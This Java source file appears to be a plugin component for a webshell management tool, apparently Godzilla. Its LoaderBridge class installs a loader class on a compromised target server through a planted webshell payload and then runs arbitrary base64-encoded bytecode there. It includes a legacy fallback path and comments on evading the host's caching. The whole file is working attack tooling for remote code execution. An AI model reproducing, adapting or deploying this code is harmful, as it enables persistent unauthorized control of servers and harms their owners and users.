package gz.dynamiccode;

import core.imp.Payload;
import util.http.ReqParameter;

import java.lang.reflect.Method;

/**
 * 客户端与目标端的交互层。
 *
 * <p>安装：把加载器 class 送上去（优先用 Payload.include，失败回退旧流程）。
 * <p>运行：调用目标端加载器，执行待加载的 class。
 *
 * <p>注意：调用 evalFunc 时类名必须非空。宿主的缓存处理只在类名为 null 时生效，
 * 传非空类名可避开缓存分支；另加随机 nonce，避免个别版本按参数做缓存命中。
 */
public class LoaderBridge {

    private final Payload payload;
    private final String loaderName;
    private boolean installed;
    private String mappedName;

    public LoaderBridge(Payload payload, String loaderName) {
        this.payload = payload;
        this.loaderName = loaderName;
        this.mappedName = loaderName;
    }

    public boolean isInstalled() {
        return installed;
    }

    public void reset() {
        this.installed = false;
        this.mappedName = loaderName;
    }

    /** 安装加载器；返回是否成功。 */
    public boolean install(byte[] loaderBytes) {
        boolean ok = false;
        String resolved = loaderName;

        Method include = findMethod(payload.getClass(), "include",
                new Class[]{String.class, byte[].class});
        if (include != null) {
            try {
                Object value = include.invoke(payload, new Object[]{loaderName, loaderBytes});
                ok = !(value instanceof Boolean) || ((Boolean) value).booleanValue();
            } catch (Throwable ignored) {
                ok = false;
            }
            if (ok) {
                resolved = resolveName(payload.getClass());
            }
        }
        if (!ok) {
            String legacy = includeLegacy(loaderBytes);
            if (legacy != null) {
                ok = true;
                resolved = legacy;
            }
        }

        if (ok) {
            installed = true;
            mappedName = resolved;
        }
        return ok;
    }

    /** 返回目标端实际使用的类名（用于展示）。 */
    public String getMappedName() {
        return mappedName;
    }

    /** 执行：base64 为 class 字节码，type 为类加载器类型。 */
    public byte[] run(String base64, String className, int type) throws Exception {
        ReqParameter parameter = new ReqParameter();
        parameter.add("base64Code", base64);
        parameter.add("className", className);
        parameter.add("classloaderType", String.valueOf(type));
        parameter.add("_nonce", String.valueOf(System.nanoTime()));

        try {
            return payload.evalFunc(loaderName, "run", parameter);
        } catch (Throwable ignored) {
            // 极老版本忽略类名参数，补上映射名后重试
        }
        parameter.add("evalClassName", mappedName);
        return payload.evalFunc(null, "run", parameter);
    }

    // ------------------------------------------------------------------

    private String includeLegacy(byte[] loaderBytes) {
        try {
            Method update = findMethod(payload.getClass(), "dynamicUpdateClassName",
                    new Class[]{String.class, byte[].class});
            if (update == null) {
                return null;
            }
            byte[] binCode = (byte[]) update.invoke(payload, new Object[]{loaderName, loaderBytes});
            String target = resolveName(payload.getClass());

            ReqParameter parameter = new ReqParameter();
            parameter.add("binCode", binCode);
            parameter.add("codeName", target);
            byte[] result = payload.evalFunc(null, "include", parameter);
            String text = result == null ? "" : Codec.text(result).trim();
            return "ok".equals(text) ? target : null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private String resolveName(Class<?> payloadClass) {
        try {
            Method getClassName = findMethod(payloadClass, "getClassName",
                    new Class[]{String.class});
            if (getClassName != null) {
                Object mapped = getClassName.invoke(payload, new Object[]{loaderName});
                if (mapped != null && String.valueOf(mapped).trim().length() > 0) {
                    return String.valueOf(mapped).trim();
                }
            }
        } catch (Throwable ignored) {
            // 用原名
        }
        return loaderName;
    }

    private static Method findMethod(Class<?> clazz, String name, Class<?>[] params) {
        while (clazz != null) {
            try {
                Method m = clazz.getDeclaredMethod(name, params);
                m.setAccessible(true);
                return m;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }
}
